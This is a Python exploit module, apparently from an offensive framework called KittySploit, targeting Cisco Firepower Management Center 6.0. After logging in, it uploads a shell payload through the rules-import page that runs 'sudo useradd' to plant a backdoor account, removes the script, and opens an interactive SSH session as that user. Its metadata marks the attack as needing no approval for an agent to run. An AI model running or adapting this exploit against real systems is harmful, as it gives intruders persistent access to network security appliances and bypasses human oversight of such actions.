#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""firepower_management60_rce"""


from kittysploit import *
from lib.protocols.http.http_client import Http_client



class Module(Auxiliary, Http_client):
    __info__ = {
        'name': 'firepower_management60_rce',
        'description': 'firepower_management60_rce',
        'author': ['KittySploit Team'],
        
        'platform': Platform.LINUX,
        'references': [],
        'tags': ['iot', 'router', 'unauth', 'auxiliary'],
        'agent': {
            'risk': 'active',
            'effects': ['credential_access', 'data_exfiltration'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['credentials', 'risk_signals'],
        },
    }

    def run(self):
        self.session = requests.Session()

        if self.check():
            print_success("Target seems to be vulnerable")
            if self.login():
                if not self.newusername:
                    self.newusername = self.random_text(8)
                if not self.newpassword:
                    self.newpassword = self.random_text(8)

                self.create_ssh_backdoor(self.newusername, self.newpassword)

                # Log into the SSH backdoor account
                self.init_ssh_session(self.newusername, self.newpassword)
            else:
                print_error("Exploit failed. Could not log in")
        else:
            print_error("Exploit failed. Target seems to be not vulnerable.")
    def check(self):
        response = self.http_request(
            method="GET",
            path="/img/favicon.png?v=6.0.1-1213",
        )

        if response is not None and response.status_code == 200:
            ssh_client = self.ssh_create(port=self.ssh_port)
            if ssh_client.test_connect():
                return True  # target is vulnerable

        return False  # target is not vulnerable
    def login(self):
        data = {
            "username": self.username,
            "password": self.password,
            "target": ""
        }

        print_status("Trying to authenticate")
        response = self.http_request(
            method="POST",
            path="/login.cgi?logout=1",
            data=data,
            allow_redirects=False,
            session=self.session,
        )

        if response is None:
            return False

        if response.status_code == 302 and "CGISESSID" in response.cookies.keys():
            print_status("CGI Session ID: {}".format(response.cookies['CGISESSID']))
            print_success("Authenticated as {}:{}".format(self.username, self.password))
            return True

        print_error("Exploit failed. Could not authenticate.")
        return False
    def create_ssh_backdoor(self, username, password):
        sh_name = 'exploit.sh'
        sf_action_id = self.get_sf_action_id()

        payload = "sudo useradd -g ldapgroup -p `openssl passwd -1 {}` {}; rm /var/sf/SRU/{}".format(password, username, sh_name)

        print_status("Attempting to create SSH backdoor")

        multipart_form_data = {
            "action_submit": (None, "Import"),
            "source": (None, "file"),
            "manual_update": (None, "1"),
            "sf_action_id": (None, sf_action_id),
            "file": (sh_name, payload)
        }

        self.http_request(
            method="POST",
            path="/DetectionPolicy/rules/rulesimport.cgi",
            files=multipart_form_data,
            session=self.session
        )

        return
    def get_sf_action_id(self):
        print_status("Attempting to obtain sf_action_id from rulesimport.cgi")

        response = self.http_request(
            method="GET",
            path="/DetectionPolicy/rules/rulesimport.cgi",
            session=self.session
        )
        if response is None:
            return None

        res = re.findall("sf_action_id = '(.+)';", response.text)

        if len(res) > 1:
            print_status("Found sf_action_id: {}".format(res[1]))
            return res[1]

        return None
    def init_ssh_session(self, username, password):
        print_status("Trying to authenticate through SSH with username: {} password:{} account".format(username, password))
        ssh_client = self.ssh_create()
        if ssh_client.login(username, password):
            print_success("SSH - Successful authentication")
            ssh_client.interactive()
